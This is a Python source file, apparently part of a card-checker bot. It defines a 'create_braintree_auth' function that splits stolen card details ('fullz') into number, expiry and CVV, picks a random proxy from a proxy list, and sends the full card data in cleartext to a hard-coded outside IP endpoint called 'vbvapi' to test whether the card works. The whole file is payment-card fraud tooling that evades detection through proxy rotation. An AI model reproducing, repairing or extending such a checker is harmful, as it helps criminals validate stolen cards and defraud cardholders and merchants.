import base64
import json
import random
import re
import string
import time
from fake_useragent import UserAgent
from FUNC.usersdb_func import *
from FUNC.defs import *
from bs4 import BeautifulSoup
import requests
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import unquote, urlparse, parse_qs

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

async def create_braintree_auth(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        if not all([cc, mes, ano, cvv]):
            raise ValueError("Invalid card details format")

        getproxy = random.choice(open("FILES/proxy.txt", "r", encoding="utf-8").read().splitlines())
        if not getproxy:
            raise ValueError("No proxy available")

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,de;q=0.8,it;q=0.7,ru;q=0.6,es;q=0.5',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        }

        response = await session.get(
            f'http://74.50.123.49:9151/vbvapi?lista={cc}|{mes}|{ano}|{cvv}&proxy={getproxy}',
            headers=headers,
        )

        if response.status != 200:
            raise ValueError(f"API request failed with status {response.status}: {response.text}")

        print(f"Response text: {response.text}")
        result = gets(response.text, '"result": "', '"')
        if result is None:
            raise ValueError("Failed to extract result from API response")

        return result

    except Exception as e:
        return str(e)

